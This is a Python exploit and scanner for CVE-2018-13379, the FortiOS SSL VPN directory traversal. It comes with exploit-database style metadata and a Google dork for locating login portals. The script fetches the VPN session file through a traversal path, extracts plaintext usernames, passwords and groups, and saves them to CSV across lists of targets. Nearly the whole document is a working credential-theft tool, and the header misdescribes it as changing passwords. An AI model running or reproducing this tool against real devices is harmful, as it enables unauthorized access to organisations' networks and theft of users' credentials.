# Script Title: FortiVPN CVE-2018-13379 Vulnerability
# Exploit Title: FortiOS Leak file - Reading login/passwords in clear text.
# Google Dork: intext:"Please Login" inurl:"/remote/login"
# Date: 17/08/2019
# Original Exploit Author: Carlos E. Vieira
# Updated Script Author: Adonis Sardiñas
# Details: This exploit allow change users password from SSLVPN web portal
# Vendor Homepage: https://www.fortinet.com/
# Software Link: https://www.fortinet.com/products/fortigate/fortios.html
# Version: This vulnerability affect ( FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0 to 6.0.4 ).
# Tested on: 5.6.6
# NVD: https://nvd.nist.gov/vuln/detail/CVE-2018-13379
# CVE : CVE-2018-13379
# Extract Useful info (credentials!) from SSL VPN Directory Traversal Vulnerability (FG-IR-18-384)
# Credits: 7Elements, John M (@x41x41x41), David S (@DavidStubley)
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
# # # # # Rescoures and External Link
# # # # # Fortinet PSIRT:   https://www.fortiguard.com/psirt/FG-IR-18-384 
# # # # # Exploit DB:   https://www.exploit-db.com/exploits/47287 
# # # # # Fortinet Blog:    https://www.fortinet.com/blog/business-and-technology/update-regarding-cve-2018-13379 
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 



#!/usr/bin/python3

import argparse, urllib.request, ssl, csv, string, socket, re
from IPy import IP
import OpenSSL.crypto as crypto

def exploit(target):
    target = target.strip()
    try:
        url = 'https://'+str(target)+'/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
        req = urllib.request.urlopen(url, None, context=NOSSL, timeout=10)
        result = req.read()
        if req.code == int(200) and str('var fgt_lang =') in str(result):
            subjectCN = getSubjectCN(target)
            print('[!] '+str(target)+' ('+subjectCN+') appears to be vulnerable ('+str(len(result))+') bytes returned')
            DEVICES.append([str(target), str(subjectCN), ('Vulnerable')])
            if args.credscan == 'y':
                parse(target, result, subjectCN)
        else:
            subjectCN = getSubjectCN(target)
            print('[!] '+str(target)+' does not appear to be vulnerable')
            DEVICES.append([str(target), str(subjectCN), ('Patched')])
    except urllib.error.HTTPError as e:
        subjectCN = getSubjectCN(target)
        print('[!] '+str(target)+' does not appear to be vulnerable ('+str(e.code)+', +'+str(e.reason)+')')
        DEVICES.append([str(target), str(subjectCN), ('Patched')])
    except urllib.error.URLError as e:
        print('[!] '+str(target)+' seems to be invalid)')
        DEVICES.append([str(target), ('Invalid Target'), ('Invalid Target')])
    except TimeoutError:
        print('[!] '+str(target)+' Timed Out')
    except:   
        print('[!] '+str(target)+' unhandled error :(')

def parse(target, process, subjectCN):
    comp = bytearray()
    empty = bytearray()
    counter = 0
    foundcount = 0
    for byte in process:
        if byte == 0x00:
            # Throw these out
            counter = counter + 1
            continue
        if empty == comp:
            comp.append(byte)
        else:
            comp.append(byte)
            comp = comp[-2:]
        if comp == LOOKFOR or comp == LOOKFORTWO:
            grabuser(target, process, counter, subjectCN)
            foundcount = foundcount + 1
        counter= counter + 1
    if foundcount == 0:
        containsIP(process, target)
    # Commented out not needed, but could come in useful for debugging
    # Remove Comments if Debugging is required.
    #print(getBinarytext(process,0,len(process)))
    #writeBinary(process, target)

def getSubjectCN(url):
    try:
        if ':' in url:
            urlsplit = url.split(':')
            print(urlsplit)
            dst = (urlsplit[0],int(urlsplit[1]))
        else:
            dst = (url,443)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect(dst)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=dst[0])
        cert_bin = s.getpeercert(True)
        x509 = crypto.load_certificate(crypto.FILETYPE_ASN1,cert_bin)
        return x509.get_subject().CN
    except: 
        return '[?] SSL NAME Grab Error Proberbly Timed Out'

def grabuser(target, process, frombyte, subjectCN):     
    extip = grabtext(process,frombyte+1)
    if isIP(extip):
        username = grabtext(process,frombyte+37)
        password = grabtext(process,frombyte+423)
        group = grabtext(process,frombyte+552)
        print('[!] '+str(target)+' ('+subjectCN+') USERFOUND U:'+str(username)+', P:'+str(password)+', G:'+str(group)+', IP:'+str(extip))
        # Prob not the best way to do this but it works...
        RESULTS.append([str(target), str(subjectCN), str(username), str(password), str(group), str(extip)])
    #else:
    #       print('[?] False Positive: '+extip)

def grabtext(process,startbyte):
    tmpstr = ''
    for byte in process[startbyte:]:
        if byte in PRINTABLE:
            tmpstr+=chr(byte)
        else:
            break
    return tmpstr

def writeBinary(process,target):
    f = open('byteoutput_'+target+'.bin', "wb")
    f.write(bytearray(process))

def getBinarytext(process,startbyte,endbyte):
    text = ''
    try:
        unprintable = False
        for byte in process[startbyte:endbyte]:
            if byte in PRINTABLE:
                text = text + chr(byte)
                unprintable = False
            else:
                if unprintable == False:
                    text = text + '...'
                    unprintable = True
    except Exception as e:   
        print('[!] '+str(e))
    return text

def isIP(lookup):
    try:
        IP(lookup)
        return True
    except:
        print('here')
        return False

def containsIP(process, target):
    # Hacky IPv4 check to see if we missed creds whilst egg hunting, if we did spit out the BIN for analysis
    # hexdump -C byteoutput_TARGET.bin | more
    m = re.match(r"((?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?\.){3}(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)))",getBinarytext(process,0,len(process)))
    if m:
        print('[?] '+str(target)+' IPs found but no creds, check the bytes used to hunt')
        writeBinary(process, target)


print("""  ___ ___  ___ _____ ___ ___   _ _____ ___ 
 | __/ _ \\| _ \\_   _|_ _/ __| /_\\_   _| __|
 | _| (_) |   / | |  | | (_ |/ _ \\| | | _| 
 |_| \\___/|_|_\\ |_| |___\\___/_/ \\_\\_| |___|                                                                   
""")
print("FortiVPN Vulnerability Scanner version 2020.12.03")
print("Extract Useful info (credentials!) from SSL VPN Directory Traversal Vulnerability (FG-IR-18-384)")
print("Tool developed by @x41x41x41 and @DavidStubley")
print("Enahanced and Tweaked by @SysEgineer")
print()

# Parse arguments
parser = argparse.ArgumentParser()
parser.add_argument('-i', '--input', default=None, help='Target URL or Domain')
parser.add_argument('-f', '--filename', default='iplist.csv', help='List of Target URL or Domain')
parser.add_argument('-o', '--output', default='output', help='File to output discovered credentials too')
parser.add_argument('-c', '--credscan', default='n', help='Execute Credential Pull y/n With great power comes great ')
args = parser.parse_args()

# Setup varibles
OUTPUTFILE = args.output
CREDSCAN = args.credscan
PRINTABLE = set(bytes(string.printable, 'ascii'))
RESULTS = []
DEVICES = []
NOSSL = ssl.create_default_context()
NOSSL.check_hostname = False
NOSSL.verify_mode = ssl.CERT_NONE
#LOOKFOR = bytearray([0x5d,0x01])
LOOKFOR = bytearray(b'^\x01')
#LOOKFORTWO = bytearray([0x5c,0x01])
LOOKFORTWO = bytearray(b'_\x01')

# Read args and kickoff processing
if args.input is None:
    with open(args.filename, 'r') as f:
        reader = csv.reader(f)
        next(reader)
        for lines in reader:
            TRGLIST = lines[0]
            exploit(TRGLIST)
else:
    INPUT = args.input
    exploit(INPUT)


# Output results
count = 0
with open(OUTPUTFILE+"USERS.csv" , 'a', newline='') as csvfile:
    CSV_WRITER = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
    CSV_WRITER.writerow([str('Target'), str('SubjectCN'), str('Username'), str('Password'), str('Group'), str('External IP')])
    for result in RESULTS:
        CSV_WRITER.writerow(result)
        count=count+1
print('[*] Finished '+str(count)+' credentials found')

count = 0
with open(OUTPUTFILE+"Targets.csv" , 'a', newline='') as csvfile:
    CSV_WRITER = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
    CSV_WRITER.writerow([str('Target'), str('SubjectCN'), str('Status')])
    for device in DEVICES:
        CSV_WRITER.writerow(device)
        count=count+1
print('[*] Finished '+str(count)+' Targets Found')
